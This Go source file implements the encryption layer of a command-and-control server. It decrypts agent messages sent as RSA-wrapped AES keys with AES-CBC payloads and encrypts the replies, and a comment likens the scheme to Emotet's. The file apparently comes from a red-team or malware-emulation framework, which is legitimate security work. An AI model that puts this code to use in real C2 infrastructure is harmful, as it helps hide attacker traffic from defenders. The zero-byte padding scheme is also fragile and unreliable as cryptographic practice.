/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package cryptography

import (
	"bytes"
	"config"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
)

// private2048Key is a global variable holding they key
// This is used to decrypt AES key from each agent request
var private2048Key *rsa.PrivateKey

// AesParams holds AES KEY and IV for each request
// Agent send new KEY and IV every request
type AesParams struct {
	key []byte
	iv  []byte
}

// LoadCrypto parses private key from a location specific in Config structure
// You have to make sure that agent has the correct public key, otherwise C2 won't be able
// to decrypt any requests.
func LoadCrypto(config *config.Config) error {
	pwd, _ := os.Getwd()
	priv, err := ioutil.ReadFile(filepath.Join(pwd, config.Receiver.KeyPath))
	if err != nil {
		log.Fatal(err)
	}
	pemBlock, _ := pem.Decode([]byte(priv))
	private2048Key, err = x509.ParsePKCS1PrivateKey(pemBlock.Bytes)

	if err != nil {
		log.Fatal(err)
	}
	return nil
}

// Decrypt is used to decrypt the message.
// You can change this function to fit your needs, and it will work for as long as
// the function recieves encrypted message and returns decrypted one.
// In the current scheme, each message contains the following:
// PUBKEY(AES+IV) AES(PROTOBUF(DATA))
func Decrypt(msg *string, aesParams *AesParams) (*[]byte, error) {
	// First, decode from Base64 form into bytes
	b64decodedMessage, err := base64.StdEncoding.DecodeString(*msg)
	if err != nil {
		return nil, err
	}
	// The AES KEY and IV is 256 bytes long and attached to the beginning to the message
	// They are encrypted with agen't public key
	encryptedKey := b64decodedMessage[:256]
	// Decrypt using OAEP
	decryptedKeys, err := rsa.DecryptOAEP(sha1.New(), rand.Reader,
		private2048Key, encryptedKey, []byte(""))
	if err != nil {
		return nil, err
	}
	// Extract and store AES KEY and IV for this request
	aesParams.key = decryptedKeys[:aes.BlockSize]
	aesParams.iv = decryptedKeys[aes.BlockSize:]
	// Initialize AES CBC Cipher and decryp the message
	block, err := aes.NewCipher(aesParams.key)
	if err != nil {
		return nil, err
	}
	mode := cipher.NewCBCDecrypter(block, aesParams.iv)
	// Remove AES KEY and IV from message
	ciphertext := b64decodedMessage[256:]
	// Decrypt
	mode.CryptBlocks(ciphertext, ciphertext)
	// Trim the message to get rid of \x00 padding bytes
	decodedData := bytes.Trim(ciphertext, "\x00")
	// Retrun reference to decoded data
	return &decodedData, nil
}

// Encrypt encrypts bytes with AES CBC and encodes with base64.
// This is a fairly straighforward function, which encrypts serialzied
// protobufs with AES key an iv supplied in request (like Emotet).
// The response will be AES(PROTOBUF(DATA))
func Encrypt(decodedData *[]byte, aesParams *AesParams) (*string, error) {
	// Initialize cipher with previously saved AesParams
	block, err := aes.NewCipher(aesParams.key)
	if err != nil {
		return nil, err
	}
	// Pad the string with \x00
	padLen := aes.BlockSize - len(*decodedData)%aes.BlockSize
	pad := bytes.Repeat([]byte{0}, padLen)
	paddedData := append(*decodedData, pad...)
	ciphertext := make([]byte, len(paddedData))
	// Encrypt the message
	mode := cipher.NewCBCEncrypter(block, aesParams.iv)
	mode.CryptBlocks(ciphertext, paddedData)
	encodedMessage := base64.StdEncoding.EncodeToString(ciphertext)
	return &encodedMessage, nil
}
